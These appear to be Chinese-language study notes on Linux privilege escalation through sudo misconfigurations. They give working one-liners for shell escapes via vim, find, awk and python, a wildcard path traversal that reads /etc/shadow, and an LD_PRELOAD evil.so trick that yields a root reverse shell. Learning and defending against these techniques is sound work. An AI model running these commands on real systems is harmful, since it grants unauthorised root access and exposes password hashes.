sudo -l:查找允许用sudo跑什么,需要免密或者当前用户密码

sudo -l 输出: (root) NOPASSWD: /usr/bin/vim
        │
        ▼
  借这个命令开子 shell:
  sudo vim -c ':!/bin/bash'
  sudo find . -exec /bin/sh \;
  sudo awk 'BEGIN{system("/bin/sh")}'
  sudo python3 -c 'import os;os.system("/bin/sh")'
        │
        ▼
  root shell
2.通过通配符塞入../实现目录穿越
www-data  ALL=(ALL)  /bin/cat /var/log/*
                │
                ▼
 sudo cat /var/log/../../etc/shadow
    "../../etc/shadow" 被 * 一口吃掉
        → 文本匹配成功 → 放行
                │
                ▼
        内核解析 :
        /var/log/../../etc/shadow
             │   │   │
             │   │   └─ 再上一级
             │   └───── 上一级
             └───────── 从 /var/log 退回
                        │
                        ▼
        最后落到 /etc/shadow  ← 读到不该读的了

3.对动态链接命令执行时留下环境变量
www-data要做的:
        │
        ├─ 写一个 evil.so   → 放入可写目录
        ├─ export LD_PRELOAD=/可写目录/evil.so
        └─ sudo -E /usr/bin/非suid程序
        │
        ▼
   sudo -E(保留之前的环境变量) /usr/bin/非suid程序 保留环境调用动态链接自动加载LD_PRELOAD表中的环境变量
        │
        ▼
   它启动时，动态链接器"额外"把 evil.so 塞进进程
        │
        ▼
   于是这个进程里就多了你的代码
        │
        ▼
  root执行evil.so,执行反射shell